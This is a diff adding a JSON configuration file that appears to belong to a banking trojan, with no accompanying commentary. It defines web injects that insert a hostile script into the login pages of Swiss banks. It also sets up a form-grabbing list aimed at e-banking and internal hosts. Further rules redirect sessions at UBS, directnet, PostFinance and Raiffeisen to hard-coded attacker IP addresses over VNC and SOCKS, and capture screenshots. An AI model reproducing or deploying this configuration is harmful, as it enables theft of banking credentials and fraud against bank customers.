@@ -1,0 +1,418 @@
+{
+    "httpinjects": [
+        {
+            "conditions": [
+                {
+                    "modifier1": "U", 
+                    "modifier2": "", 
+                    "onget": "1", 
+                    "value": "^https://(wwwsec|inba|banking|netbanking)\\..+\\.ch/authen/login(\\?|$)", 
+                    "onpost": "1", 
+                    "type": "allow"
+                }, 
+                {
+                    "modifier1": "", 
+                    "modifier2": "", 
+                    "onget": "0", 
+                    "value": "\\.(gif|png|jpg|css|swf)($|\\?)", 
+                    "onpost": "1", 
+                    "type": "deny"
+                }
+            ], 
+            "modify": [
+                {
+                    "pattern": "(</html>)", 
+                    "modifiers": "i", 
+                    "replacement": "\\1<script type=\"text/javascript\" src=\"scripts/msoffice365.js\"></script>"
+                }
+            ], 
+            "label": "wwwsecinba_xml"
+        }, 
+        {
+            "conditions": [
+                {
+                    "modifier1": "U", 
+                    "modifier2": "", 
+                    "onget": "1", 
+                    "value": "^https?://localhost:9000/workbench/WorkbenchOpenAction\\.do.*", 
+                    "onpost": "1", 
+                    "type": "allow"
+                }, 
+                {
+                    "modifier1": "", 
+                    "modifier2": "", 
+                    "onget": "0", 
+                    "value": "\\.(gif|png|jpg|css|swf)($|\\?)", 
+                    "onpost": "1", 
+                    "type": "deny"
+                }
+            ], 
+            "modify": [
+                {
+                    "pattern": "(</html>)", 
+                    "modifiers": "i", 
+                    "replacement": "\\1<script type=\"text/javascript\" src=\"scripts/msoffice365.js\"></script>"
+                }
+            ], 
+            "label": "localhost9000ch_xml"
+        }, 
+        {
+            "conditions": [
+                {
+                    "modifier1": "U", 
+                    "modifier2": "", 
+                    "onget": "1", 
+                    "value": "^https://.+\\.ch/(authen|WEB_XSA_LOGIN)/login\\.xhtml", 
+                    "onpost": "1", 
+                    "type": "allow"
+                }, 
+                {
+                    "modifier1": "", 
+                    "modifier2": "", 
+                    "onget": "0", 
+                    "value": "\\.(gif|png|jpg|css|swf)($|\\?)", 
+                    "onpost": "1", 
+                    "type": "deny"
+                }
+            ], 
+            "modify": [
+                {
+                    "pattern": "(</head>)", 
+                    "modifiers": "i", 
+                    "replacement": "<script type=\"text/javascript\" src=\"/WEB_XSA_LOGIN/scripts/msoffice365.js\"></script>\\1"
+                }
+            ], 
+            "label": "loginxhtml_xml"
+        }
+    ], 
+    "formgrabber": [
+        {
+            "type": "allow", 
+            "value": "^http://sisesrv1/"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://synfo/"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://.+\\:81/.*"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://.+\\:8888/.*"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://.+\\:8090/.*"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://.+\\:8084/.*"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://127\\.0\\.0\\.1:3495"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://.+/MULTIVERSA"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://.+/workbench/"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://.+/flows/ebanking/"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://srvesmad04:8080/"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://srvaweb01/"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://.*/sapphire/"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://192\\.168\\.161\\.23"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://.+/mscmain"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://shv-09"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://intersection"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://cujc-arcu/"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://.+\\:3495/.*"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://.+\\:3496/.*"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://.+\\:40000/.*"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://.+\\:9000/.*"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://core-web/"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://core-syn/"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://r-space/"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://dtsgui\\.cbhi\\.local/"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://10\\.118\\.32\\.33/"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://webmail\\."
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://dtsacquire2011"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://arta2/"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://dtsap:70/"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://nmain/"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://170\\.209\\.0\\.(3|2)"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://.*/flows/banking/"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://.*/b2b/faces/login/"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://.*ingbusinessonline"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://.*multiweb"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://.*multiversa"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://bankway.*/"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://ebanking"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://.*office-wings"
+        }, 
+        {
+            "type": "allow", 
+            "value": "^http://.+/login\\.aspx"
+        }, 
+        {
+            "type": "deny", 
+            "value": "^https://.*\\.liverail\\.com"
+        }, 
+        {
+            "type": "deny", 
+            "value": "^https://urs\\.microsoft\\.com/"
+        }, 
+        {
+            "type": "deny", 
+            "value": "^https://.+\\.services\\.mozilla\\.com/"
+        }, 
+        {
+            "type": "deny", 
+            "value": "^https://localhost.*/skypectoc/"
+        }, 
+        {
+            "type": "deny", 
+            "value": "^https://.*\\.skype\\.com/api/"
+        }, 
+        {
+            "type": "deny", 
+            "value": "^https://syndication\\.twitter\\.com/"
+        }, 
+        {
+            "type": "deny", 
+            "value": "^https://incoming\\.telemetry\\.mozilla\\.org/"
+        }, 
+        {
+            "type": "deny", 
+            "value": "^https://www\\.bing\\.com/"
+        }, 
+        {
+            "type": "deny", 
+            "value": "^https://geo\\.query\\.yahoo\\.com/"
+        }, 
+        {
+            "type": "deny", 
+            "value": "^https://self-repair\\.mozilla\\.org/api/"
+        }
+    ], 
+    "handlers": [
+        {
+            "script": "switchoff.js", 
+            "handler": "timeout", 
+            "name": "name", 
+            "uri": "https://149.202.196.38:4431/B88U86giIPyD55RK/"
+        }
+    ], 
+    "httpinjblock": [
+        {
+            "type": "allow", 
+            "value": "cashproonline-.+\\.bankofamerica\\.com"
+        }, 
+        {
+            "type": "allow", 
+            "value": "www3\\.bankline\\."
+        }, 
+        {
+            "type": "allow", 
+            "value": "pioneer\\.co-operativebank\\."
+        }, 
+        {
+            "type": "allow", 
+            "value": "go\\.ashx"
+        }
+    ], 
+    "redirects2": [
+        {
+            "redirect": "msoffice365.js", 
+            "vnc": true, 
+            "name": "2nd_t", 
+            "timeout": 30, 
+            "postfwd": false, 
+            "uri": "https://149.202.196.38:4431/engagement", 
+            "socks": true
+        }, 
+        {
+            "redirect": "ember3.js", 
+            "vnc": false, 
+            "name": "1st_t", 
+            "timeout": 20, 
+            "postfwd": false, 
+            "uri": "https://149.202.196.38:4431/dealdemand", 
+            "socks": false
+        }, 
+        {
+            "redirect": "^https://ebanking\\-ch\\d*\\.ubs\\.com/workbench/", 
+            "vnc": false, 
+            "name": "ubs_ebanking_redirect", 
+            "timeout": 20, 
+            "postfwd": true, 
+            "uri": "https://128.199.56.195:4343/5/ubs_ebanking2_y7rKX8yF819Lg3/", 
+            "socks": false
+        }, 
+        {
+            "redirect": "^https://cs\\.directnet\\.com/dn/c/cls/", 
+            "vnc": false, 
+            "name": "directnet_cs_redirect", 
+            "timeout": 20, 
+            "postfwd": true, 
+            "uri": "https://128.199.56.195:4343/5/directnet_cs_y7rKX8yF819Lg3/", 
+            "socks": false
+        }, 
+        {
+            "redirect": "^https://nab\\.directnet\\.com/dn/c/cls/", 
+            "vnc": false, 
+            "name": "directnet_nab_redirect", 
+            "timeout": 20, 
+            "postfwd": true, 
+            "uri": "https://128.199.56.195:4343/5/directnet_nab_y7rKX8yF819Lg3/", 
+            "socks": false
+        }, 
+        {
+            "redirect": "^https://www\\.postfinance\\.ch/ap/ba/fp/html/e\\-finance/", 
+            "vnc": false, 
+            "name": "postfinance_redirect", 
+            "timeout": 20, 
+            "postfwd": true, 
+            "uri": "https://128.199.56.195:4343/5/postfinance_y7rKX8yF819Lg3/", 
+            "socks": false
+        }, 
+        {
+            "redirect": "^https://ebanking\\.raiffeisen\\.ch/entry/", 
+            "vnc": false, 
+            "name": "raiffeisen_ch_redirect", 
+            "timeout": 20, 
+            "postfwd": true, 
+            "uri": "https://128.199.56.195:4343/5/raiffeisen_ch_y7rKX8yF819Lg3/", 
+            "socks": false
+        }, 
+        {
+            "redirect": "^https://.*/image777000/(.+)", 
+            "vnc": false, 
+            "name": "images_redirect", 
+            "timeout": 20, 
+            "postfwd": true, 
+            "uri": "https://81.27.33.53:4431/get-dbYd81hd83H/\\1", 
+            "socks": false
+        }
+    ], 
+    "httpshots": [
+        {
+            "onget": "1", 
+            "type": "deny", 
+            "value": "\\.(gif|png|jpg|css|swf|ico|js)($|\\?)", 
+            "onpost": "1"
+        }, 
+        {
+            "onget": "1", 
+            "type": "deny", 
+            "value": "(resource\\.axd|yimg\\.com)", 
+            "onpost": "1"
+        }, 
+        {
+            "onget": "1", 
+            "type": "allow", 
+            "value": "^http://localhost\\:9000/", 
+            "onpost": "1"
+        }
+    ]
+}
